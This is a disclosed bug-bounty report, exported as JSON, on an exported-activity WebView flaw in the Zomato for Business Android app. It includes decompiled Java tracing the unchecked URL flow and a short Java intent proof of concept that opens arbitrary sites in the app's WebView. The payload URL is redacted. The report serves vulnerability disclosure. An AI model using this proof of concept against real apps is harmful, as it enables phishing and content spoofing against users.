{"id":537670,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81Mzc2NzA=","url":"https://hackerone.com/reports/537670","title":"[Zomato for Business Android] Vulnerability in exported activity WebView","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-04-13T22:49:58.519Z","submitted_at":"2019-04-13T22:49:58.519Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"shell_c0de","url":"/shell_c0de","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-09-23T05:56:45.667Z","bug_reporter_agreed_on_going_public_at":"2021-07-05T14:28:10.987Z","team_member_agreed_on_going_public_at":"2021-09-23T05:56:45.576Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello, i want to report the vulnerability found,\nSince the following activity `com.application.zomatomerchant.home.HomeSalt` has `exported=\"true\"` it can be exploited by another application.\n\n###Application Information\n\nApplication: [Zomato for Business](https://play.google.com/store/apps/details?id=com.application.zomatomerchant)\nPackage Name: `com.application.zomatomerchant`\nVersion: `4.2.5`\nVersion Status: Last\nVulnerable class: `com.application.zomatomerchant.deeplink.SaltDeepLinkRouterActivity`\n\n###Vulnerability\n\nUsing a special intent, you can send a malicious url to class `com.application.zomatomerchant.ZWebView`\n```java\npublic class HomeSalt extends PhiAppCompatActivityWithSimpleToolbar implements C0806a, C0928a {\nprotected void onCreate(Bundle bundle) {\n        super.onCreate(bundle);\n        if (this.f2062r == null) {\n            this.f2062r = C0940a.m2184a(this);\n        }\n        mo7458b(R.layout.home_salt);\n        mo7475d(R.string.app_name);\n        this.f2061q = (Toolbar) findViewById(R.id.toolbar_simple_root);\n        this.f2059o = (DrawerLayout) findViewById(R.id.drawer_layout);\n        if (getIntent() != null) {\n            Uri data = getIntent().getData();\n            if (data != null \u0026\u0026 m2113a(data.toString())) {\n                Bundle extras = getIntent().getExtras();\n                if (extras == null || !extras.getBoolean(\"notification_popup\", false)) {\n                    mo10440c(data);//put data\n//...\n public void mo10440c(Uri uri) {\n        if (!C0807b.f1729a.equals(uri)) {\n            if (mo10218b(uri)) {\n                mo10217a(uri);\n            } else {\n                SaltDeepLinkRouterActivity.m1755a((Context) this, uri);//put data\n//...\npublic static void m1755a(Context context, Uri uri) {\n        Intent intent = new Intent(context, SaltDeepLinkRouterActivity.class);\n        intent.setFlags(268435456);\n        intent.setData(uri);\n        context.startActivity(intent);\n    }\n//...\n protected void onCreate(Bundle bundle) {\n        super.onCreate(bundle);\n        Intent intent = getIntent();\n        if (!(intent == null || intent.getData() == null)) {\n            Uri data = intent.getData();\n            if (mo10218b(data)) {\n                mo10217a(data);//put data\n//..\n public void mo10217a(Uri uri) {\n        if (uri != null) {\n            Intent intent;\n            C0810e a = C0810e.m1769a((Activity) this);\n            String host = uri.getHost();\n            List pathSegments = uri.getPathSegments();\n            int size = pathSegments != null ? pathSegments.size() : 0;\n         \n                } else if (!C2150af.m6783a(uri.getScheme()) \u0026\u0026 uri.getScheme().startsWith(\"http\")) {\n                    intent = new Intent(this, ZWebView.class);//load url\n                    intent.putExtra(\"open_external\", true);\n                    intent.putExtra(NativeProtocol.IMAGE_URL_KEY, uri.toString());//put data\n```\nHost check missing.\nF468292\n###PoC\n\nJava PoC:\n```java\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);\nintent.setClassName(\"com.application.zomatomerchant\",\"com.application.zomatomerchant.home.HomeSalt\");\nintent.setData(Uri.parse(\"███████/\"));\nstartActivity(intent);\n```\nPayload: ██████\n###Fix\n\nCheck the host before load to WebView\n\n## Impact\n\nXSS/Ability of open arbitrary sites in your internal WebView\n\nAllows you to replace the content in the application on malicious website. The user will not be able to understand the difference.\n\nThe vulnerability is included in the [Google Play Security Reward Program](https://hackerone.com/googleplay) (section 2 Theft of insecure private date)","original_report_id":null,"original_report_url":null,"attachments":[{"id":468292,"file_name":"webviewz.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/468/292/0074522cdd03fdb5d84172b3a421e3c1d8c8b456/webviewz.jpg?response-content-disposition=attachment%3B%20filename%3D%22webviewz.jpg%22%3B%20filename%2A%3DUTF-8%27%27webviewz.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150951Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e8eb631733b36a7d09f28b6f6a87179a98fb8a4e54911e46ebaf619b0dc32ffa","file_size":41448,"type":"image/jpeg"}],"allow_singular_disclosure_at":null,"vote_count":43,"voters":["tolga","run_win","sainath_reddy","shell_c0de","alp","ali","imranhudaa","imran_nazir","sudi","rahulkadavil_","and 33 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":388,"asset_type":"GOOGLE_PLAY_APP_ID","asset_identifier":"com.application.zomatomerchant","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4556449,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @shell_c0de, \n\nThanks for the submission, we are looking into this. \n\nThanks \n@ehsahil-zomato  ","automated_response":false,"created_at":"2019-04-14T06:29:34.095Z","updated_at":"2019-04-14T06:29:34.095Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4559965,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @shell_c0de,\n \nWe have discussed this within the team, this would be fixed in the newer version of the app. \n\nIt would take us some time before we roll out the new version of the app and considering it as low priority, we won't be rolling out the fix in the current version.\n\nClosing this as resolve, so you get the reputation points. Moreover, merchant apps are not eligible for bounty as stated within our scope.\n\nThanks.\n@ehsahil-zomato ","automated_response":false,"created_at":"2019-04-15T05:35:14.118Z","updated_at":"2019-04-15T05:35:14.118Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"shell_c0de","url":"/shell_c0de"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4559968,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2019-04-15T05:35:47.620Z","updated_at":"2019-04-15T05:35:47.620Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zomato"}},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4565225,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ehsahil-zomato,\n\nYes, thanks!","automated_response":false,"created_at":"2019-04-15T15:51:55.825Z","updated_at":"2019-04-15T15:52:03.058Z","actor":{"username":"shell_c0de","cleared":true,"url":"/shell_c0de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12358671,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @biryani-is-lob\nFull disclosure, please?\n\nKind regards,\n@shell_c0de","automated_response":false,"created_at":"2021-07-05T14:27:54.251Z","updated_at":"2021-07-05T14:27:54.251Z","actor":{"username":"shell_c0de","cleared":true,"url":"/shell_c0de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12358672,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-07-05T14:28:11.025Z","updated_at":"2021-07-05T14:28:11.025Z","first_to_agree":true,"actor":{"username":"shell_c0de","cleared":true,"url":"/shell_c0de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":13588356,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-09-23T05:56:45.595Z","updated_at":"2021-09-23T05:56:45.595Z","actor":{"username":"panipuri","cleared":false,"url":"/panipuri","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z1ak0ih5yfoswr8h45lbq9h0veao/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22panipuri.jpg%22%3B%20filename%2A%3DUTF-8%27%27panipuri.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150951Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=05b16fa07da768d19e986b9a3c4f2e11ed7bc2a6cb4653a3c5a39b2a791d2ad5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":13588357,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-09-23T05:56:45.697Z","updated_at":"2021-09-23T05:56:45.697Z","actor":{"username":"panipuri","cleared":false,"url":"/panipuri","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/z1ak0ih5yfoswr8h45lbq9h0veao/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22panipuri.jpg%22%3B%20filename%2A%3DUTF-8%27%27panipuri.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150951Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=05b16fa07da768d19e986b9a3c4f2e11ed7bc2a6cb4653a3c5a39b2a791d2ad5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}